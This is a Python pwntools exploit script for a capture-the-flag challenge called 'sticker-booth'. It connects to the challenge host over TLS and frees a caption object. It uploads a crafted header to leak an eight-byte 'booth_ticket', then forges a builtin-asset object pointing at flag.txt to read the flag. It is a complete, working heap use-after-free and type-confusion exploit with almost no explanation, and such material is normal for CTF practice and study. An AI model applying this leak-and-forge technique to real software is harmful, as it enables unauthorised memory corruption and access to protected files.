#!/usr/bin/env python3
from pwn import *

HOST = "sticker-booth-edbceb3d89be.inst18.ctf.fortid.com"
PORT = 1337
elf = context.binary = ELF('./chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force

            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl = True, sni = HOST)
    else:
        return elf.process()

p = conn()

def sl(x):
    if isinstance(x, str):
        x = x.encode()
    p.sendline(x)

def hx(b: bytes) -> str:
    return b.hex()

sl(f"photo p 2 1 {hx(b'\xff'*8)}")

sl("caption c1 AAAA")
sl("caption c2 AAAA")

sl("builtin b heart")

sl("mono p")

sl("remove c1")

#   +0x00: refcount = 1
#   +0x02: subtype = 1  => caption
#   +0x03: unused
#   +0x04: length = 0x80

pl = flat(
    p16(1),
    p8(1),  
    p8(0),
    p32(0x80),
)

sl(f"upload u {hx(pl)}")
sl("print")

data = p.recvuntil(b"assets/heart.txt")

marker = b"assets/heart.txt"
ticket = data[-len(marker)-8:-len(marker)]

log.success(f"booth_ticket = {ticket.hex()}")

sl("remove u")

#   +0x00: refcount = 1
#   +0x02: subtype = 2  => builtin asset
#   +0x03: enabled = 1
#   +0x04: path length = len("flag.txt")
#   +0x08: booth_ticket leaked
#   +0x10: "flag.txt"

fake = flat(
    p16(1),
    p8(2),            
    p8(1),   
    p32(8),
    ticket,
    b"flag.txt",
)

sl(f"upload u2 {hx(fake)}")
sl("print")

p.interactive()